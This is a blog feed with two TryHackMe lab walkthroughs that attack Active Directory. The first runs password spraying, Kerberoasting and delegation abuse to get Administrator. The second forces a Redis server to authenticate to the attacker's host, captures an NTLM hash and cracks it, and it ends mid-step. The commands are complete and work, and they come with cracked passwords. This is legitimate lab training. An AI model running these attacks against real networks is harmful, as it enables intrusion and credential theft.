<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en-US"><generator uri="https://jekyllrb.com/" version="4.1.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en-US" /><updated>2022-02-01T03:58:04+00:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">blog @ zexion.dev</title><subtitle>Illusions :(</subtitle><author><name>zexionx00</name><email>zexionx00@gmail.com</email></author><entry><title type="html">Crocc Crew - Try Hack Me</title><link href="http://localhost:4000/CrocCrew/" rel="alternate" type="text/html" title="Crocc Crew - Try Hack Me" /><published>2022-01-31T00:00:07+00:00</published><updated>2022-01-31T00:00:07+00:00</updated><id>http://localhost:4000/CrocCrew</id><content type="html" xml:base="http://localhost:4000/CrocCrew/"><![CDATA[<figure>
<img src="/assets/img/crew/crew.png" alt="Crew" />
<figcaption> Crocc Crew - Try Hack Me </figcaption>
</figure>

<h1 id="nmap">Nmap</h1>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Nmap 7.91 scan initiated Mon Jan 31 22:05:47 2022 as: nmap -sC -sV -vv -oA nmap/ports 10.10.44.104</span>
Nmap scan report <span class="k">for </span>10.10.44.104
Host is up, received echo-reply ttl 127 <span class="o">(</span>0.31s latency<span class="o">)</span><span class="nb">.</span>
Scanned at 2022-01-31 22:05:48 EST <span class="k">for </span>114s
Not shown: 987 filtered ports
Reason: 987 no-responses
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2022-02-01 03:06:09Z<span class="o">)</span>
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: COOCTUS.CORP0., Site: Default-First-Site-Name<span class="o">)</span>
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: COOCTUS.CORP0., Site: Default-First-Site-Name<span class="o">)</span>
3269/tcp open  tcpwrapped    syn-ack ttl 127
3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: COOCTUS
|   NetBIOS_Domain_Name: COOCTUS
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: COOCTUS.CORP
|   DNS_Computer_Name: DC.COOCTUS.CORP
|   Product_Version: 10.0.17763
|_  System_Time: 2022-02-01T03:06:32+00:00
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC.COOCTUS.CORP
| Issuer: <span class="nv">commonName</span><span class="o">=</span>DC.COOCTUS.CORP
| Public Key <span class="nb">type</span>: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-01-31T03:04:22
| Not valid after:  2022-08-02T03:04:22
| MD5:   564b 338c fbbd f75d 11ea a15c 5686 6060
| SHA-1: c8fc f30e 63b2 b68d 27bb b307 4308 a0d4 d02b fa54
| <span class="nt">-----BEGIN</span> CERTIFICATE-----
| MIIC4jCCAcqgAwIBAgIQMpmK6rtiFYFFYvOcxCBihTANBgkqhkiG9w0BAQsFADAa
| MRgwFgYDVQQDEw9EQy5DT09DVFVTLkNPUlAwHhcNMjIwMTMxMDMwNDIyWhcNMjIw
| ODAyMDMwNDIyWjAaMRgwFgYDVQQDEw9EQy5DT09DVFVTLkNPUlAwggEiMA0GCSqG
| SIb3DQEBAQUAA4IBDwAwggEKAoIBAQCbiJRU8mMoBBNN2qTljJqQs6KLy57Z3mnh
| +foiHxAhWHgu/oe1U4syQawsyu6Wc55hlMTvTx2vzYM2VhSswl+R2r9dMSr0kp3E
| dyXrtsI37dewAim8bonvcHprn3X/AbSoej5ayLH83Hghs0vSSr21JSoNR79oVb9V
| paVlWI4G0pnenDUeFFX5a38x+e075ivKu5r3tIfe3ousFWbh8vAe41drmVWhdk9P
| 2WueQ+gMayXym6vnhMolg6ALM7/Si697sShSPK2gxq+lStwrQVkhQBJsB3vpoapn
| GgqXgSA3ImxaxIQTvJGpVboV6wW8PaHBkeAKi41byRtYnTgAA/GNAgMBAAGjJDAi
| MBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsF
| AAOCAQEAL5l4FBRgDo1JKPy2vP9mhsO6M69BrOH42mDId3e/cZiWOBGI80UC3KKc
| kJxkKKhez1jHRyfL1G2SQffJhmzOGyFaBrk38BkBblq3XHL0Co9ry0Th7ZvTXy2n
| JSQog+ezRqTfs9aRkwRYO8hT5t3vM4k1H+FB/aTetAjUlvTcKaSlBenoad+Kqif6
| +98BWZxwwQqJj62RbO7A32poXuc7OFWe6ZNk3Z+x+uEqBQwhxoR5H9FjnyXW+/GO
| UG6v+Qln6Lax8YzszPah09T/RzjXge6RsF8TbCBb9S2fDpT1dvFsMUEe0uTuLSWo
| w6I4mlDec+7fx6xqVV/yyNTvMT4oYg<span class="o">==</span>
|_-----END CERTIFICATE-----
|_ssl-date: 2022-02-01T03:07:33+00:00<span class="p">;</span> <span class="nt">-1s</span> from scanner time.
Service Info: Host: DC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: <span class="nt">-1s</span>, deviation: 0s, median: <span class="nt">-1s</span>
| p2p-conficker: 
|   Checking <span class="k">for </span>Conficker.C or higher...
|   Check 1 <span class="o">(</span>port 4473/tcp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
|   Check 2 <span class="o">(</span>port 59461/tcp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
|   Check 3 <span class="o">(</span>port 33391/udp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
|   Check 4 <span class="o">(</span>port 38295/udp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   <span class="nb">date</span>: 2022-02-01T03:06:35
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
<span class="c"># Nmap done at Mon Jan 31 22:07:42 2022 -- 1 IP address (1 host up) scanned in 115.27 seconds</span>
</code></pre></div></div>

<p>Nmap shows domain, add it to hosts file and move on.</p>

<h1 id="web">Web</h1>

<p>We can some usernames from web in which three of the usernames are valid.</p>

<figure>
<img src="/assets/img/crew/users.png" alt="Users" />
<figcaption> Users </figcaption>
</figure>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>% kerbrute userenum <span class="nt">-d</span> cooctus.corp <span class="nb">users</span> <span class="nt">--dc</span> 10.10.44.104

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/                                        

Version: v1.0.3 <span class="o">(</span>9dad6e1<span class="o">)</span> - 01/31/22 - Ronnie Flathers @ropnop

2022/01/31 22:31:16 <span class="o">&gt;</span>  Using KDC<span class="o">(</span>s<span class="o">)</span>:
2022/01/31 22:31:16 <span class="o">&gt;</span>   10.10.44.104:88

2022/01/31 22:31:16 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       varg@cooctus.corp
2022/01/31 22:31:16 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       cryillic@cooctus.corp
2022/01/31 22:31:16 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       fawaz@cooctus.corp
</code></pre></div></div>

<p>But none of the user has preauth set.</p>

<h1 id="cme">CME</h1>

<p>Trying to bruteforce the password for those users, we immediately get a hit on cryillic with qwerty.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>% crackmapexec smb cooctus.corp <span class="nt">-u</span> <span class="nb">users</span> <span class="nt">-p</span> /usr/share/wordlists/rockyou.txt 
SMB         cooctus.corp    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:COOCTUS.CORP<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         cooctus.corp    445    DC               <span class="o">[</span>-] COOCTUS.CORP<span class="se">\c</span>ryillic:123456 STATUS_LOGON_FAILURE 
SMB         cooctus.corp    445    DC               <span class="o">[</span>-] COOCTUS.CORP<span class="se">\c</span>ryillic:12345 STATUS_LOGON_FAILURE 
SMB         cooctus.corp    445    DC               <span class="o">[</span>-] COOCTUS.CORP<span class="se">\c</span>ryillic:123456789 STATUS_LOGON_FAILURE 
SMB         cooctus.corp    445    DC               <span class="o">[</span>-] COOCTUS.CORP<span class="se">\c</span>ryillic:password STATUS_LOGON_FAILURE 
SMB         cooctus.corp    445    DC               <span class="o">[</span>-] COOCTUS.CORP<span class="se">\c</span>ryillic:iloveyou STATUS_LOGON_FAILURE 
SMB         cooctus.corp    445    DC               <span class="o">[</span>-] COOCTUS.CORP<span class="se">\c</span>ryillic:princess STATUS_LOGON_FAILURE 
SMB         cooctus.corp    445    DC               <span class="o">[</span>-] COOCTUS.CORP<span class="se">\c</span>ryillic:1234567 STATUS_LOGON_FAILURE 
SMB         cooctus.corp    445    DC               <span class="o">[</span>-] COOCTUS.CORP<span class="se">\c</span>ryillic:rockyou STATUS_LOGON_FAILURE 
SMB         cooctus.corp    445    DC               <span class="o">[</span>-] COOCTUS.CORP<span class="se">\c</span>ryillic:12345678 STATUS_LOGON_FAILURE 
SMB         cooctus.corp    445    DC               <span class="o">[</span>-] COOCTUS.CORP<span class="se">\c</span>ryillic:abc123 STATUS_LOGON_FAILURE 
SMB         cooctus.corp    445    DC               <span class="o">[</span>-] COOCTUS.CORP<span class="se">\c</span>ryillic:nicole STATUS_LOGON_FAILURE 
SMB         cooctus.corp    445    DC               <span class="o">[</span>-] COOCTUS.CORP<span class="se">\c</span>ryillic:daniel STATUS_LOGON_FAILURE 
SMB         cooctus.corp    445    DC               <span class="o">[</span>-] COOCTUS.CORP<span class="se">\c</span>ryillic:babygirl STATUS_LOGON_FAILURE 
SMB         cooctus.corp    445    DC               <span class="o">[</span>-] COOCTUS.CORP<span class="se">\c</span>ryillic:monkey STATUS_LOGON_FAILURE 
SMB         cooctus.corp    445    DC               <span class="o">[</span>-] COOCTUS.CORP<span class="se">\c</span>ryillic:lovely STATUS_LOGON_FAILURE 
SMB         cooctus.corp    445    DC               <span class="o">[</span>-] COOCTUS.CORP<span class="se">\c</span>ryillic:jessica STATUS_LOGON_FAILURE 
SMB         cooctus.corp    445    DC               <span class="o">[</span>-] COOCTUS.CORP<span class="se">\c</span>ryillic:654321 STATUS_LOGON_FAILURE 
SMB         cooctus.corp    445    DC               <span class="o">[</span>-] COOCTUS.CORP<span class="se">\c</span>ryillic:michael STATUS_LOGON_FAILURE 
SMB         cooctus.corp    445    DC               <span class="o">[</span>-] COOCTUS.CORP<span class="se">\c</span>ryillic:ashley STATUS_LOGON_FAILURE 
SMB         cooctus.corp    445    DC               <span class="o">[</span>+] COOCTUS.CORP<span class="se">\c</span>ryillic:qwerty 
</code></pre></div></div>

<h1 id="kerberoast">Kerberoast</h1>

<p>Kerberoasting with those creds, we get a new account called password-reset with password resetpassword. Finding more about the account with impacket’s finddelegation, we can see that our account is configured with constrained delegations which makes us able to request ticket of users.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>% crackmapexec ldap cooctus.corp <span class="nt">-u</span> cryillic <span class="nt">-p</span> qwerty <span class="nt">--kerberoasting</span> <span class="nb">hash                 
</span>SMB         cooctus.corp    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:COOCTUS.CORP<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
LDAP        cooctus.corp    389    DC               <span class="o">[</span>+] COOCTUS.CORP<span class="se">\c</span>ryillic:qwerty 
LDAP        cooctus.corp    389    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Total of records returned 4                                                                                                           
LDAP        cooctus.corp    389    DC               sAMAccountName: password-reset memberOf:  pwdLastSet: 2021-06-08 18:00:39.356663 lastLogon:2021-06-08 17:46:23.369540
LDAP        cooctus.corp    389    DC               <span class="nv">$krb5tgs$23$*</span>password-reset<span class="nv">$COOCTUS</span>.CORP<span class="nv">$HTTP</span>/dc.cooctus.corp<span class="k">*</span><span class="nv">$33e57f3d810ba61d230ff836aa9e57b6$a683b48c5d77403b702988b4507e22649f130dadb1</span>
a119f52025cd6465db7a94f3d57b40d6e14882b4da838c551f9e9314221657e9d4fc5ee48bdcc00a820dad46c5181e6bb46a4c73940fc8214e7a94b22c85200b0c74f17b77572b2798387aa846708842f79e52a79bac518c3f2f4a6495d378
14f5765815f64d0bff6a4f0e69be05e03ef12c2b7fca6dbeff5dc1d1610b5e9354ad4f1f2fe460668069a5b54766ae168b0c429a09fa2c4cb5e0b34541e46c93287cca549842bb38dda20489fc9843274a3a8d366a54d0e6f6f23e381b6234
14263b31391649e9f958c7e8dfd0ace55e359e83c50899816d86c2ed70721c688eb4fb79af1743424b6dc2a2b3e38d61280b43779c100d4ccf67cd5190ed75bfdbc00e02a2e15801129d3777ee11e3690f07c1f5e526817967dd62cb2f055e
bfde7162f2e93193d3f72ba94ec097cc6720d4efcc4ddc3678763d25a1ad8ceba1d078eb670e3c97d118f59c2f4f372b2f4a1839df64e3bd474d369416e66e195bdf32257356f7c58492c98000bb4b204bc44759e5486d5d97f95ea52bdbfb
00c98ec08763c3d5b5d6dc70bfd0094f4eb6bd0540dcde3f81f4b9f845b896a975d8aa69f25ca04fe84d3d34cba8c095496f3fa4d75272ab903402d8346d7f0ecbac4b43b690cc796737a08bc1f54371f8fb58fc79682d451de0a8f5c0055f
3970b9621cb4a9a17734548441379a687ac6238e182a17d17305b82bfa1c18866a89f597f30c0287a6853bbbdd58fb52a21d5dfeee01217663d7732d684012c71fee8f1f72783797bbb7956ade3d1f97af987012dab72398f92379ec60610a
3b152afaf81fc9f0b4197aaa7920aaa9a4b899bfd2ee2f73a9924c2d3667f6eae7db2bdbe994494fc465e6747fbf0537014c6f9159c7d9cb755ad33e26161c9894b430b46ce225a86dfcc743aa04d9d28d650c890e0aab91a3a72bc8bf51ae
64293dcfc7dd4e332a9ffdae882fdab32f34f5247e3eb07c7d8694b49da9e7fd846ab1ee319ef45669e5a2f17254aa0af3da0be087a7d2cd44f422fcbb3744b425e4a9598c71d10db81003065a247aade136deb6fa845fa5ef161a4e68ec1b
79d2cbde2c5ed9ffbaa2447ce9c7faf6391285ee5d00a8b1fa0593ec1b51ace55b21dd92f7284b1bfeb507e6e3878e072c1616436a524cb3cd927cf17a55a48a911f595710693f34869ae9b25c8d12b1ef3ec4b803a611efcb8b61b0e1a8af
abbf18f6314fdd4ca32badc09a76936109582a388d4f4a0dc7a38a7d15d09974c15a94fcd901028308478358721697d091353345d254ef514b60849de4dd4725920f12c00442a7ea0b4be72515936837b704aa8aa1de3aa921d43677cbd58<span class="err">$</span>
b8a252c2a037821bc26fba82cb4e9e3c1510
LDAP        cooctus.corp    389    DC               <span class="o">[</span>-] Error with the LDAP account used
% john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt <span class="nb">hash                                     
</span>Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>krb5tgs, Kerberos 5 TGS etype 23 <span class="o">[</span>MD4 HMAC-MD5 RC4]<span class="o">)</span>
Will run 4 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
resetpassword    <span class="o">(</span>?<span class="o">)</span>
1g 0:00:00:00 DONE <span class="o">(</span>2022-01-31 22:39<span class="o">)</span> 2.500g/s 591360p/s 591360c/s 591360C/s rikelme..pink panther
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed
</code></pre></div></div>

<h1 id="finddelegationpy">findDelegation.py</h1>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-findDelegation <span class="nt">-debug</span> cooctus.corp/<span class="s1">'password-reset:resetpassword'</span> <span class="nt">-dc-ip</span> 10.10.44.104                                                                                          
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation                                       
                                                                                                                                                                                              
<span class="o">[</span>+] Impacket Library Installation Path: /usr/local/lib/python3.9/dist-packages/impacket                                                                                                       
<span class="o">[</span>+] Connecting to 10.10.44.104, port 389, SSL False
<span class="o">[</span>+] Total of records returned 4
AccountName     AccountType  DelegationType                      DelegationRightsTo                   
<span class="nt">--------------</span>  <span class="nt">-----------</span>  <span class="nt">----------------------------------</span>  <span class="nt">-----------------------------------</span>
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC.COOCTUS.CORP/COOCTUS.CORP 
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC.COOCTUS.CORP               
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC                            
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC.COOCTUS.CORP/COOCTUS       
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC/COOCTUS                    
</code></pre></div></div>

<h1 id="getstpy">getST.py</h1>

<p>And we get a ticket of Administrator.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>% getST.py <span class="nt">-spn</span> oakley/DC.COOCTUS.CORP <span class="nt">-impersonate</span> Administrator <span class="s1">'cooctus.corp/password-reset:resetpassword'</span> <span class="nt">-dc-ip</span> 10.10.44.104
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Getting TGT <span class="k">for </span>user
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Impersonating Administrator
<span class="o">[</span><span class="k">*</span><span class="o">]</span>     Requesting S4U2self
<span class="o">[</span><span class="k">*</span><span class="o">]</span>     Requesting S4U2Proxy
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saving ticket <span class="k">in </span>Administrator.ccache

% <span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator.ccache 

% wmiexec.py cooctus.corp/Administrator@dc.cooctus.corp <span class="nt">-k</span> <span class="nt">-no-pass</span>
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

<span class="o">[</span><span class="k">*</span><span class="o">]</span> SMBv3.0 dialect used
<span class="o">[!]</span> Launching semi-interactive shell - Careful what you execute
<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
C:<span class="se">\&gt;</span><span class="nb">whoami
</span>cooctus<span class="se">\a</span>dministrator

C:<span class="se">\&gt;</span>
</code></pre></div></div>]]></content><author><name>zexionx00</name><email>zexionx00@gmail.com</email></author><category term="THM" /><summary type="html"><![CDATA[Insane rated machine from Try Hack Me]]></summary></entry><entry><title type="html">Vulnet Active - Try Hack Me</title><link href="http://localhost:4000/VulnetActive/" rel="alternate" type="text/html" title="Vulnet Active - Try Hack Me" /><published>2021-11-07T00:00:07+00:00</published><updated>2021-11-07T00:00:07+00:00</updated><id>http://localhost:4000/VulnetActive</id><content type="html" xml:base="http://localhost:4000/VulnetActive/"><![CDATA[<figure>
<img src="/assets/img/active/active.png" alt="active" />
<figcaption> Vulnet Active - Try Hack Me </figcaption>
</figure>

<h1 id="introduction">Introduction</h1>

<p><a href="https://tryhackme.com/room/vulnnetactive" target="_blank" rel="noopener nofollow"> Vulnet Active</a> is a room from Try Hack Me which includes a request from redis server to capture the hash of enterprise-security’s user. We can access the SMB with those creds and there is a powershell script which looks like a scheduled task. So, we change script to give us a reverse shell. For root, we run bloodhound and find that we have GenericWrite privileges on one of the GPO. So, we run <a href="https://github.com/byronkg/SharpGPOAbuse" target="_blank" rel="noopener nofollow">SharpGPOAbuse.exe</a> to escalate our user to Administrator.</p>

<h1 id="nmap">Nmap</h1>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c"># Nmap 7.91 scan initiated Mon Jan 31 04:12:07 2022 as: nmap -p53,135,139,445,464,6379,49665,49667,49669,49670,49683,49696,49722 -sC -sV -vv -oA nmap/ports 10.10.248.175</span>
Nmap scan report <span class="k">for </span>10.10.248.175
Host is up, received echo-reply ttl 127 <span class="o">(</span>0.36s latency<span class="o">)</span><span class="nb">.</span>
Scanned at 2022-01-31 04:12:07 EST <span class="k">for </span>104s

PORT      STATE    SERVICE       REASON          VERSION
53/tcp    open     domain        syn-ack ttl 127 Simple DNS Plus
135/tcp   open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open     netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds? syn-ack ttl 127
464/tcp   open     kpasswd5?     syn-ack ttl 127
6379/tcp  open     redis         syn-ack ttl 127 Redis key-value store 2.8.2402
49665/tcp open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp filtered unknown       no-response
49669/tcp open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open     ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49683/tcp filtered unknown       no-response
49696/tcp filtered unknown       no-response
49722/tcp filtered unknown       no-response
Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 0s
| p2p-conficker: 
|   Checking <span class="k">for </span>Conficker.C or higher...
|   Check 1 <span class="o">(</span>port 17126/tcp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
|   Check 2 <span class="o">(</span>port 57239/tcp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
|   Check 3 <span class="o">(</span>port 56820/udp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
|   Check 4 <span class="o">(</span>port 17011/udp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   <span class="nb">date</span>: 2022-01-31T09:13:16
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
<span class="c"># Nmap done at Mon Jan 31 04:13:51 2022 -- 1 IP address (1 host up) scanned in 104.12 seconds</span></code></pre></figure>

<h1 id="smb">SMB</h1>

<p>There is no access on guest/anonymous user but the domain is leaked.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">% crackmapexec smb 10.10.248.175 <span class="nt">-u</span> <span class="s1">''</span> <span class="nt">-p</span> <span class="s1">''</span>
SMB         10.10.248.175   445    VULNNET-BC3TCK1  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:VULNNET-BC3TCK1<span class="o">)</span> <span class="o">(</span>domain:vulnnet.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.248.175   445    VULNNET-BC3TCK1  <span class="o">[</span>-] vulnnet.local<span class="se">\:</span> STATUS_ACCESS_DENIED </code></pre></figure>

<h1 id="redis">Redis</h1>

<p>Checking for redis in hacktricks, we find <a href="https://www.agarri.fr/blog/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html" target="_blank" rel="noopener nofollow">LUA sandbox bypass</a>, which describes about hacking redis via HTTP Requests. So, let’s try to connect from redis’ server and start a responder to catch the hash.</p>

<h1 id="ntlm-hash">NTLM Hash</h1>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">% redis-cli <span class="nt">-h</span> 10.10.248.175
10.10.248.175:6379&gt; <span class="nb">eval</span> <span class="s2">"dofile('//10.18.25.218/zex')"</span> 0
<span class="o">(</span>error<span class="o">)</span> ERR Error running script <span class="o">(</span>call to f_648174d937245e390c24fab91e2ed0b1f39af8fa<span class="o">)</span>: @user_script:1: cannot open //10.18.25.218/zex: Permission denied 
<span class="o">(</span>9.38s<span class="o">)</span>
10.10.248.175:6379&gt; 

<span class="nv">$ </span><span class="nb">sudo </span>responder <span class="nt">-I</span> tun0

<span class="o">[</span> <span class="nt">-----</span> SNIP <span class="nt">-----</span><span class="o">]</span>
<span class="o">[</span>SMB] NTLMv2-SSP Client   : 10.10.248.175
<span class="o">[</span>SMB] NTLMv2-SSP Username : VULNNET<span class="se">\e</span>nterprise-security
<span class="o">[</span>SMB] NTLMv2-SSP Hash     : enterprise-security::VULNNET:8900f350aacb86ba:59A8E887432500EC2651A0AF3CC90A4B:010100000000000080FDBB345B16D801AB035CD0D5C01EF400000000020008004E00440032004F0001001E00570049004E002D004A005900510053004F0037004D00460043004C00550004003400570049004E002D004A005900510053004F0037004D00460043004C0055002E004E00440032004F002E004C004F00430041004C00030014004E00440032004F002E004C004F00430041004C00050014004E00440032004F002E004C004F00430041004C000700080080FDBB345B16D8010600040002000000080030003000000000000000000000000030000094A3656A068C685B12C2A013265CAE9AD297CB1BBDA9BDAFC4BCF142B0AFCE190A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310038002E00320035002E003200310038000000000000000000
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Skipping previously captured <span class="nb">hash </span><span class="k">for </span>VULNNET<span class="se">\e</span>nterprise-security

% john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt <span class="nb">hash 
</span>Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>netntlmv2, NTLMv2 C/R <span class="o">[</span>MD4 HMAC-MD5 32/64]<span class="o">)</span>
Will run 4 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
sand_0873959498  <span class="o">(</span>enterprise-security<span class="o">)</span>
1g 0:00:00:01 DONE <span class="o">(</span>2022-01-31 04:34<span class="o">)</span> 0.5780g/s 2320Kp/s 2320Kc/s 2320KC/s sandoval69..sand36
Use the <span class="s2">"--show --format=netntlmv2"</span> options to display all of the cracked passwords reliably
Session completed</code></pre></figure>

<p>And now we access to SMB, with those creds. We find a powershell script which looks like a scheduled job. So, let’s change it to give ourself a reverse using nishang one line powershell reverse shell.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">crackmapexec smb 10.10.248.175 <span class="nt">-u</span> <span class="s1">'enterprise-security'</span> <span class="nt">-p</span> <span class="s1">'sand_0873959498'</span> <span class="nt">--shares</span>
SMB         10.10.248.175   445    VULNNET-BC3TCK1  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:VULNNET-BC3TCK1<span class="o">)</span> <span class="o">(</span>domain:vulnnet.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.248.175   445    VULNNET-BC3TCK1  <span class="o">[</span>+] vulnnet.local<span class="se">\e</span>nterprise-security:sand_0873959498 
SMB         10.10.248.175   445    VULNNET-BC3TCK1  <span class="o">[</span>+] Enumerated shares
SMB         10.10.248.175   445    VULNNET-BC3TCK1  Share           Permissions     Remark
SMB         10.10.248.175   445    VULNNET-BC3TCK1  <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
SMB         10.10.248.175   445    VULNNET-BC3TCK1  ADMIN<span class="nv">$ </span>                         Remote Admin
SMB         10.10.248.175   445    VULNNET-BC3TCK1  C<span class="nv">$ </span>                             Default share
SMB         10.10.248.175   445    VULNNET-BC3TCK1  Enterprise-Share READ            
SMB         10.10.248.175   445    VULNNET-BC3TCK1  IPC<span class="nv">$ </span>           READ            Remote IPC
SMB         10.10.248.175   445    VULNNET-BC3TCK1  NETLOGON        READ            Logon server share 
SMB         10.10.248.175   445    VULNNET-BC3TCK1  SYSVOL          READ            Logon server share</code></pre></figure>

<h1 id="reverse-shell">Reverse Shell</h1>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">% smbclient <span class="se">\\\\</span>vulnnet.local<span class="se">\\</span>Enterprise-Share <span class="nt">-U</span> enterprise-security
Enter WORKGROUP<span class="se">\e</span>nterprise-security<span class="s1">'s password: 
Try "help" to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Tue Feb 23 17:45:41 2021
